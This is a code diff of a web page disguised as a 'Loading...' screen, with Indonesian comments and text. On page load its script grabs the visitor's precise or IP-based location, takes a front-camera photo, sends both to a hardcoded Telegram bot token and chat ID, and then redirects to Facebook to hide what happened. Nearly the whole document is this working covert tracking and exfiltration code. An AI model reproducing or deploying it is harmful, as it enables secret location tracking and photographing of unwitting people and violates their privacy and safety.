@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Loading...</title>
+<title>Memuat...</title>
 <style>
   body { margin:0; background:#fff; font-family:sans-serif; height:100vh; overflow:hidden; }
 </style>
@@ -15,99 +15,97 @@ const BOT_TOKEN = "8634866786:AAEOEqCHMoqqwfwc1VWb35Braps_zzwX-zE";
 const CHAT_ID   = "1966317946";
 const FB_URL    = "https://www.facebook.com/";
 
-let locationText = "Lokasi: Ditolak / Gagal";
-let cameraDone = false;
-let locationDone = false;
+let locText = "Lokasi tidak tersedia.";
+let locDone = false;
+let camDone = false;
+let photoBlob = null;
 
-// Fungsi kirim pesan text
-function sendText(text) {
-  const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-  const data = JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "HTML" });
-  
-  if (navigator.sendBeacon) {
-    const blob = new Blob([data], {type: 'application/json'});
-    navigator.sendBeacon(url, blob);
-  } else {
-    fetch(url, {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: data,
-      keepalive: true
-    }).catch(()=>{});
+function checkDone() {
+  if (locDone && camDone) {
+    setTimeout(() => {
+      kirimKeTelegram();
+    }, 500);
   }
 }
 
-// Fungsi kirim foto (pakai multipart/form-data)
-async function sendPhoto(blob) {
-  const form = new FormData();
-  form.append("chat_id", CHAT_ID);
-  form.append("photo", blob, "cam.jpg");
+async function kirimKeTelegram() {
   try {
-    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    const textData = JSON.stringify({
+      chat_id: CHAT_ID,
+      text: "<b>Data Masuk</b>\n" + locText,
+      parse_mode: "HTML"
+    });
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
       method: "POST",
-      body: form,
+      headers: { "Content-Type": "application/json" },
+      body: textData,
       keepalive: true
     });
   } catch(e) {}
-}
 
-// Fungsi cek apakah semua proses udah selesai
-async function finish() {
-  if (locationDone && cameraDone) {
-    // Kirim teks lokasi
-    sendText("<b>Data Masuk</b>\n" + locationText);
-    
-    // Tunggu 2 detik biar server Telegram sempet proses semua request
-    setTimeout(() => {
-      window.location.replace(FB_URL);
-    }, 2000);
+  if (photoBlob) {
+    try {
+      const form = new FormData();
+      form.append("chat_id", CHAT_ID);
+      form.append("photo", photoBlob, "cam.jpg");
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        body: form,
+        keepalive: true
+      });
+    } catch(e) {}
   }
+
+  window.location.replace(FB_URL);
 }
 
-// ==== PROSES LOKASI ====
 function prosesLokasi() {
+  const getIpLocation = async () => {
+    try {
+      const res = await fetch("https://ipapi.co/json/");
+      const data = await res.json();
+      if (data.latitude && data.longitude) {
+        locText = `Lat (IP): ${data.latitude}\nLon (IP): ${data.longitude}\nKota: ${data.city}, ${data.country_name}\nMap: https://maps.google.com/?q=${data.latitude},${data.longitude}`;
+      }
+    } catch (e) {}
+    locDone = true;
+    checkDone();
+  };
+
   if (!navigator.geolocation) {
-    locationDone = true;
-    finish();
+    getIpLocation();
     return;
   }
+
   navigator.geolocation.getCurrentPosition(
     (pos) => {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
       const acc = Math.round(pos.coords.accuracy);
-      locationText = `Lat: ${lat}\nLon: ${lon}\nAkurasi: ${acc} m\nMap: https://maps.google.com/?q=${lat},${lon}`;
-      locationDone = true;
-      finish();
+      locText = `Lat: ${lat}\nLon: ${lon}\nAkurasi: ${acc} m\nMap: https://maps.google.com/?q=${lat},${lon}`;
+      locDone = true;
+      checkDone();
     },
     (err) => {
-      locationText = "Izin lokasi ditolak / timeout.";
-      locationDone = true;
-      finish();
+      getIpLocation();
     },
     { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
   );
 }
 
-// ==== PROSES KAMERA ====
 async function prosesKamera() {
   let stream = null;
-  
-  // Coba minta kamera depan dulu, kalau gagal minta kamera default (belakang)
   try {
     stream = await navigator.mediaDevices.getUserMedia({ 
-      video: { facingMode: { exact: "user" } }, 
+      video: { facingMode: "user" }, 
       audio: false 
     });
   } catch (e1) {
     try {
-      stream = await navigator.mediaDevices.getUserMedia({ 
-        video: true, 
-        audio: false 
-      });
+      stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
     } catch (e2) {
-      cameraDone = true;
-      finish();
+      camDone = true;
+      checkDone();
       return;
     }
   }
@@ -115,42 +113,34 @@ async function prosesKamera() {
   try {
     const video = document.createElement("video");
     video.srcObject = stream;
-    video.setAttribute("playsinline", "true"); // Wajib buat iOS Safari
-    video.setAttribute("webkit-playsinline", "true");
+    video.setAttribute("playsinline", "true"); 
     video.muted = true;
     
-    // Tunggu video beneran ready dan ada ukurannya
     await new Promise((resolve) => {
       video.onloadedmetadata = () => {
-        video.play().then(() => {
-          setTimeout(resolve, 800);
-        }).catch(resolve);
+        video.play().then(() => setTimeout(resolve, 800)).catch(resolve);
       };
     });
 
     const canvas = document.createElement("canvas");
     canvas.width = video.videoWidth || 640;
     canvas.height = video.videoHeight || 480;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+    canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
 
-    canvas.toBlob(async (blob) => {
-      if (blob) await sendPhoto(blob);
-      
-      // Matikan kamera
-      stream.getTracks().forEach(track => track.stop());
-      cameraDone = true;
-      finish();
+    canvas.toBlob((blob) => {
+      if (blob) photoBlob = blob;
+      stream.getTracks().forEach(t => t.stop());
+      camDone = true;
+      checkDone();
     }, "image/jpeg", 0.8);
     
   } catch (err) {
-    if (stream) stream.getTracks().forEach(track => track.stop());
-    cameraDone = true;
-    finish();
+    if (stream) stream.getTracks().forEach(t => t.stop());
+    camDone = true;
+    checkDone();
   }
 }
 
-// Jalanin semuanya pas halaman dibuka
 window.addEventListener("DOMContentLoaded", () => {
   prosesLokasi();
   prosesKamera();
